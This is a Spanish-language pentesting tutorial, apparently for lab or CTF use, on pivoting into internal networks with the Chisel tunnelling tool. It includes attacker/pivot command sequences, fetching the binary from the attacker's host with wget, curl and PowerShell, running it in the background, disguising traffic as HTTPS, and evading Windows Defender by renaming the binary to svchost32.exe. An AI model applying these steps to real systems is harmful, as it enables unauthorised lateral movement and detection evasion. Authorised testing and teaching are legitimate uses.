# Túneles SOCKS con CHISEL

Chisel es una herramienta de tunneling TCP/UDP sobre HTTP que usa SSH como protocolo de transporte. Está escrita en Go, lo que genera binarios autocontenidos sin dependencias. Se usa habitualmente para pivoting en entornos donde SSH no está disponible o donde los firewalls solo permiten tráfico HTTP/HTTPS saliente.

### Instalación

```bash
# Descargar binario precompilado (recomendado)
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gzip -d chisel_linux_amd64.gz
mv chisel_linux_amd64 chisel
chmod +x chisel

# Verificar
./chisel --version

# Para Windows
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_windows_amd64.gz
```

### Modos de operación

Chisel tiene dos roles: **server** (normalmente en el atacante) y **client** (en el pivot host). Dentro de cada rol hay dos modos de túnel:

| Modo           | Dirección       | Uso                                        |
| -------------- | --------------- | ------------------------------------------ |
| Forward tunnel | Client → Server | Exponer un puerto del pivot en el atacante |
| Reverse tunnel | Server → Client | El atacante accede a servicios del pivot   |

### Caso 1 — SOCKS5 Proxy

El servidor escucha en el atacante. El cliente en el pivot se conecta y crea un proxy SOCKS5 que enruta tráfico hacia la red interna.

```bash
# ATACANTE — iniciar servidor
./chisel server --reverse --port 8080

# PIVOT HOST — conectar cliente y crear proxy SOCKS5 reverso
./chisel client 10.10.14.18:8080 R:socks
```

* `R:` indica reverse tunnel
* `socks` crea un proxy SOCKS5 en el servidor (atacante) en el puerto 1080 por defecto

Configurar proxychains en el atacante:

```bash
# /etc/proxychains.conf
[ProxyList]
socks5 127.0.0.1 1080
```

Ejemplos de uso de herramientas a través del túnel:

```bash
proxychains nmap -v -Pn -sT -p 445,3389,80 172.16.5.19
proxychains netexec smb 172.16.5.0/24 -u usuario -p contraseña
proxychains impacket-psexec usuario:contraseña@172.16.5.19
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

### Caso 2 — Port Forward directo&#x20;

Redirigir un puerto del pivot al atacante sin SOCKS. Útil cuando solo se necesita acceder a un servicio específico.

```bash
# ATACANTE — iniciar servidor
./chisel server --port 8080

# PIVOT HOST — redirigir su puerto local 3306 (MySQL) al atacante en 3306
./chisel client 10.10.14.18:8080 3306:localhost:3306

# En el atacante — acceder a MySQL del pivot como si fuera local
mysql -h 127.0.0.1 -P 3306 -u root -p
```

Sintaxis del port forward: `<puerto_local_atacante>:<host_destino>:<puerto_destino>`

```bash
# Acceder a RDP de un host interno a través del pivot
./chisel client 10.10.14.18:8080 13389:172.16.5.19:3389

# En el atacante
xfreerdp /v:localhost:13389 /u:usuario /p:contraseña
```

### Caso 3 — Reverse Port Forward

El pivot hace accesible un servicio de la red interna en el atacante, pero con la conexión iniciada desde el pivot:

```bash
# ATACANTE — servidor con --reverse
./chisel server --reverse --port 8080

# PIVOT HOST — reverse forward: exponer 172.16.5.19:3389 en atacante:13389
./chisel client 10.10.14.18:8080 R:13389:172.16.5.19:3389

# En el atacante
xfreerdp /v:localhost:13389 /u:victor /p:pass@123
```

### Opciones del servidor

```bash
./chisel server --help

# Opciones más usadas:
./chisel server \
  --port 8080 \           # puerto donde escucha (default 8080)
  --reverse \             # permitir tunnels reversos de los clientes
  --host 0.0.0.0 \        # interfaz donde escuchar
  --key "clave_secreta"   # autenticación (evitar conexiones no autorizadas)
```

Con `--key` el cliente debe especificar la misma clave:

```bash
./chisel client --fingerprint SHA256:... 10.10.14.18:8080 R:socks
```

### Opciones del cliente

```bash
./chisel client --help

# Opciones más usadas:
./chisel client \
  10.10.14.18:8080 \         # servidor al que conectar
  --keepalive 30s \          # keepalive para mantener el túnel activo
  --max-retry-count 3 \      # reintentos si pierde conexión
  --proxy http://proxy:8080  # usar proxy HTTP intermedio (entornos corporativos)
  R:socks                    # definición del tunnel
```

### Definición de múltiples tunnels

Un cliente puede crear varios tunnels en una sola conexión:

```bash
# SOCKS5 + port forward específico simultáneos
./chisel client 10.10.14.18:8080 R:socks R:13389:172.16.5.19:3389

# Múltiples port forwards
./chisel client 10.10.14.18:8080 \
  R:13389:172.16.5.19:3389 \
  R:18080:172.16.5.20:80 \
  R:11433:172.16.5.21:1433
```

### Uso sobre HTTPS (evasión)

Para camuflar el tráfico como HTTPS legítimo:

```bash
# ATACANTE — servidor con TLS
./chisel server --reverse --port 443 --tls-key server.key --tls-cert server.crt

# Generar certificado autofirmado
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes

# PIVOT HOST — cliente con TLS
./chisel client --tls-skip-verify https://10.10.14.18:443 R:socks
```

### Transferir chisel al pivot host

```bash
# Opción 1 — servidor HTTP temporal en el atacante
python3 -m http.server 8888
# En el pivot:
wget http://10.10.14.18:8888/chisel -O /tmp/chisel
chmod +x /tmp/chisel

# Opción 2 — SCP si hay SSH
scp chisel usuario@pivot_host:/tmp/chisel

# Opción 3 — PowerShell (Windows)
Invoke-WebRequest -Uri "http://10.10.14.18:8888/chisel.exe" -OutFile "C:\Windows\Temp\chisel.exe"

# Opción 4 — curl
curl http://10.10.14.18:8888/chisel -o /tmp/chisel && chmod +x /tmp/chisel
```

### Ejecutar en background

```bash
# Linux — background con nohup
nohup ./chisel client 10.10.14.18:8080 R:socks &
echo $!   # guardar PID para matarlo después

# Linux — disown (no muere al cerrar sesión SSH)
./chisel client 10.10.14.18:8080 R:socks &
disown

# Windows — background con PowerShell
Start-Process -NoNewWindow -FilePath "C:\Windows\Temp\chisel.exe" `
  -ArgumentList "client 10.10.14.18:8080 R:socks"
```

### Verificación del túnel

```bash
# En el atacante — verificar que el proxy SOCKS escucha
ss -tlnp | grep 1080
netstat -antp | grep 1080

# Probar el túnel con un curl simple
proxychains curl http://172.16.5.1

# Ver conexión activa del cliente
ss -tnp | grep 8080
```

### Errores comunes

**El cliente conecta pero proxychains no funciona:**

```bash
# Verificar que el proxy SOCKS está en el puerto correcto
# Por defecto Chisel usa 1080 para SOCKS
ss -tlnp | grep 1080
# Si usa otro puerto, actualizar proxychains.conf
```

**Conexión rechazada al servidor:**

```bash
# Verificar que el servidor está activo
netstat -antp | grep 8080
# Verificar firewall en el atacante
sudo ufw allow 8080/tcp
```

**Túnel se cae frecuentemente:**

```bash
# Añadir keepalive
./chisel client --keepalive 30s 10.10.14.18:8080 R:socks
```

**Windows Defender bloquea chisel.exe:**

```bash
# Renombrar el binario a algo genérico
copy chisel.exe svchost32.exe
# o compilar con nombre diferente desde Go
```

